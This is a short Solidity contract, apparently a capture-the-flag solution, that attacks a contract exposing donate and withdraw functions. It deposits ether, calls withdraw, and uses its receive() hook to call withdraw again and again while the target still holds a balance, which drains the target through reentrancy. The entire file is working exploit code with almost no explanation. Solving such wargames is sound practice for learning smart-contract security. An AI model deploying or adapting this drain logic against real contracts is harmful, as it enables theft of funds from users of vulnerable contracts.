// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceSolver {
    function solveChallenge(address challenge) public payable {
        IReentrance instance = IReentrance(challenge);
        // Increase balance for ourself
        instance.donate.value(msg.value)(address(this));
        // Start reentrance
        instance.withdraw(msg.value);
    }

    receive() external payable {
        address challenge = msg.sender;
        IReentrance instance = IReentrance(challenge);

        if (challenge.balance > 0) {
            instance.withdraw(msg.value);
        }
    }
}
